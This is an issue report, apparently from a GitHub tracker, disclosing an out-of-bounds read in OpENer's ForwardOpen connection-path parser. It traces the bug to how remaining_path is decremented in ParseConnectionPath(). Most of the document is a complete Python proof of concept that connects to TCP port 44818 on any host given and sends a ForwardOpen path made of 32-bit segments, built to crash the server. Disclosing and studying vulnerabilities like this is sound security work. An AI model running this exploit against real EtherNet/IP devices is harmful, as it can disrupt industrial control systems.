@@ -1,0 +1,297 @@
+issue #574
+
+Summary
+ForwardOpen on current master mis-accounts the remaining connection-path length when small numeric logical class / instance / connection-point segments are encoded as 32-bit logical segments.
+
+The parser advances message according to the actual logical segment encoding width in CipEpathGetLogicalValue(), but ParseConnectionPath() decrements remaining_path according to the decoded value size heuristic (or even a fixed -1 for class), not according to the segment's actual on-wire width.
+
+As a result, message can be moved past the end of the received TCP packet while remaining_path still stays positive. The later configuration-data loop then continues parsing and calls GetPathSegmentType(message) on an out-of-bounds pointer, producing a reproducible stack-buffer-overflow read on the server's TCP receive buffer.
+
+This is reachable through the real server path:
+
+TCP:44818 -> RegisterSession -> SendRRData -> CPF -> Message Router -> ForwardOpen -> ParseConnectionPath
+
+Version
+OpENer v2.3 / master branch up to commit 76b95cf
+
+Root cause
+1) Actual logical-segment consumption is width-dependent
+CipEpathGetLogicalValue() consumes bytes according to the actual logical segment format:
+
+CipDword CipEpathGetLogicalValue(const EipUint8 **message) {
+  LogicalSegmentLogicalFormat logical_format =
+    GetPathLogicalSegmentLogicalFormat(*message);
+  CipDword data = kLogicalSegmentLogicalFormatInvalid;
+  (*message) += 1; /* Move to logical value */
+  switch(logical_format) {
+    case kLogicalSegmentLogicalFormatEightBit:
+      data = GetByteFromMessage(message);
+      break;
+    case kLogicalSegmentLogicalFormatSixteenBit:
+      (*message) += 1; /* Pad byte needs to be skipped */
+      data = GetWordFromMessage(message);
+      break;
+    case kLogicalSegmentLogicalFormatThirtyTwoBit:
+      (*message) += 1; /* Pad byte needs to be skipped */
+      data = GetDwordFromMessage(message);
+      break;
+    default:
+      ...
+  }
+  return data;
+}
+This means the parser pointer advances by the real encoded width:
+
+8-bit logical segment -> 1 word
+16-bit logical segment -> 2 words
+32-bit logical segment -> 3 words
+2) ParseConnectionPath() decrements remaining_path inconsistently
+For the logical class segment, remaining_path is always decremented by exactly one word, regardless of actual encoding width:
+
+if(kSegmentTypeLogicalSegment == GetPathSegmentType(message) &&
+   kLogicalSegmentLogicalTypeClassId ==
+   GetPathLogicalSegmentLogicalType(message) ) {
+
+  class_id = CipEpathGetLogicalValue(&message);
+  class = GetCipClass(class_id);
+  ...
+} else {
+  ...
+}
+remaining_path -= 1; /* 1 16Bit word for the class part of the path */
+For the logical configuration instance, the decrement is based on the decoded value, not the actual on-wire logical format:
+
+const CipDword temp_id = CipEpathGetLogicalValue(&message);
+...
+instance_id = (CipInstanceNum)temp_id;
+/* 1 or 2 16Bit words for the configuration instance part of the path  */
+remaining_path -= (instance_id > 0xFF) ? 2 : 1; //TODO: 32 bit case missing
+For the connection-point segments, the same value-based logic is used:
+
+const CipDword temp_instance_id = CipEpathGetLogicalValue(&message);
+...
+instance_id = (CipInstanceNum)temp_instance_id;
+...
+/* 1 or 2 16Bit word for the connection point part of the path */
+remaining_path -= (instance_id > 0xFF) ? 2 : 1;
+3) Parser state desynchronization
+If small values such as:
+
+class = 0x04
+config instance = 151
+connection points = 150, 100
+are intentionally encoded as 32-bit logical segments, CipEpathGetLogicalValue() actually consumes 3 words each, but ParseConnectionPath() only subtracts:
+
+class: 1
+config instance: 1 (because 151 <= 0xFF)
+connection point: 1
+connection point: 1
+So the parser consumes 12 words but only decrements remaining_path by 4 words.
+
+This creates a desync between:
+
+the real parser pointer: message
+the accounting variable: remaining_path
+4) The later config-data loop reads past the TCP receive buffer
+After the logical path is parsed, ParseConnectionPath() continues while remaining_path > 0:
+
+while(remaining_path > 0) { /* remaining_path_size something left in the path should be configuration data */
+
+  SegmentType segment_type = GetPathSegmentType(message);
+  switch(segment_type) {
+    case kSegmentTypeDataSegment: {
+      ...
+At this point, message may already point past the end of the actual received packet, but remaining_path is still positive because of the accounting bug. The next GetPathSegmentType(message) dereferences an out-of-bounds byte.
+
+The dereference itself is immediate in GetPathSegmentType():
+
+SegmentType GetPathSegmentType(const CipOctet *const cip_path) {
+  const unsigned int kSegmentTypeMask = 0xE0;
+  const unsigned int segment_type = *cip_path & kSegmentTypeMask;
+  ...
+}
+
+PoC
+
+#!/usr/bin/env python3
+import os
+import socket
+import struct
+import sys
+
+
+HOST = os.environ.get("OPENER_HOST", "127.0.0.1")
+PORT = 44818
+
+CONFIG_ASM = 151
+O2T_ASM = 150
+T2O_ASM = 100
+FILLER_BYTE = 0x41
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes) -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    request = encap(0x0065, 0, struct.pack("<HH", 1, 0), b"REGSESSN")
+    sock.sendall(request)
+    response = sock.recv(1024)
+    if len(response) < 8:
+        raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def wrap_send_rr_data(session: int, cip: bytes, context: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHHH",
+        0,
+        0,
+        2,
+        0x0000,
+        0x0000,
+        0x00B2,
+        len(cip),
+    ) + cip
+    return encap(0x006F, session, cpf, context)
+
+
+def seg8_class(value: int) -> bytes:
+    return bytes([0x20, value & 0xFF])
+
+
+def seg8_inst(value: int) -> bytes:
+    return bytes([0x24, value & 0xFF])
+
+
+def seg8_conn(value: int) -> bytes:
+    return bytes([0x2C, value & 0xFF])
+
+
+def seg32_class(value: int) -> bytes:
+    return bytes([0x22, 0x00]) + struct.pack("<I", value)
+
+
+def seg32_inst(value: int) -> bytes:
+    return bytes([0x26, 0x00]) + struct.pack("<I", value)
+
+
+def seg32_conn(value: int) -> bytes:
+    return bytes([0x2E, 0x00]) + struct.pack("<I", value)
+
+
+def build_path(mode: str) -> bytes:
+    if mode == "valid":
+        return (
+            seg8_class(0x04)
+            + seg8_inst(CONFIG_ASM)
+            + seg8_conn(O2T_ASM)
+            + seg8_conn(T2O_ASM)
+        )
+
+    if mode == "baseline":
+        head = (
+            seg8_class(0x04)
+            + seg8_inst(CONFIG_ASM)
+            + seg8_conn(O2T_ASM)
+            + seg8_conn(T2O_ASM)
+        )
+    elif mode == "crash":
+        head = (
+            seg32_class(0x04)
+            + seg32_inst(CONFIG_ASM)
+            + seg32_conn(O2T_ASM)
+            + seg32_conn(T2O_ASM)
+        )
+    else:
+        raise ValueError(mode)
+
+    filler_words = (430 - len(head) - 2) // 2
+    filler = bytes([FILLER_BYTE]) * (filler_words * 2)
+    path = head + bytes([0x80, filler_words]) + filler
+    if len(path) != 430:
+        raise RuntimeError(f"unexpected {mode} path length {len(path)}")
+    return path
+
+
+def build_forward_open(path_bytes: bytes, connection_id: int, produced_id: int,
+                       serial: int, originator_serial: int) -> bytes:
+    cip = bytes([0x54, 0x02, 0x20, 0x06, 0x24, 0x01])
+    cip += struct.pack(
+        "<BBIIHHIB3xIHIHB",
+        0x0A,
+        0x0E,
+        connection_id,
+        produced_id,
+        serial,
+        0x4321,
+        originator_serial,
+        0x01,
+        100000,
+        0x4026,
+        100000,
+        0x4022,
+        0x01,
+    )
+    cip += struct.pack("<B", len(path_bytes) // 2)
+    cip += path_bytes
+    return cip
+
+
+def parse_mr_reply(response: bytes) -> None:
+    if not response:
+        print("response=timeout")
+        return
+    offset = 24 + 6 + 2 + 4 + 4
+    mr = response[offset:]
+    if len(mr) < 4:
+        print(f"response={response.hex()}")
+        return
+    reply_service, _reserved, general_status, add_status_size = mr[:4]
+    pos = 4
+    add_status = []
+    for _ in range(add_status_size):
+        add_status.append(struct.unpack_from("<H", mr, pos)[0])
+        pos += 2
+    print(
+        f"reply_service=0x{reply_service:02x} general_status=0x{general_status:02x} "
+        f"additional_status={add_status} payload={mr[pos:].hex()}"
+    )
+
+
+def main() -> int:
+    mode = sys.argv[1] if len(sys.argv) > 1 else "crash"
+    host = sys.argv[2] if len(sys.argv) > 2 else HOST
+    if mode not in {"valid", "baseline", "crash"}:
+        print(f"usage: {sys.argv[0]} [valid|baseline|crash] [host]", file=sys.stderr)
+        return 2
+
+    path = build_path(mode)
+    params = {
+        "valid": (0x10101010, 0x20202020, 0x1234, 0x01020304, b"FOVALID!"),
+        "baseline": (0x30303030, 0x40404040, 0x2345, 0x11121314, b"FOBASE!!"),
+        "crash": (0x50505050, 0x60606060, 0x3456, 0x21222324, b"FO32BIT!"),
+    }[mode]
+    cip = build_forward_open(path, params[0], params[1], params[2], params[3])
+    packet = wrap_send_rr_data(0, cip, params[4])
+    print(
+        f"mode={mode} host={host} path_len={len(path)} path_words={len(path) // 2} "
+        f"cip_len={len(cip)} packet_len={len(packet)}"
+    )
+
+    with socket.create_connection((host, PORT), timeout=3.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+        sock.sendall(wrap_send_rr_data(session, cip, params[4]))
+        sock.settimeout(1.0)
+        try:
+            response = sock.recv(4096)
+        except socket.timeout:
+            response = b""
+
+    parse_mr_reply(response)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
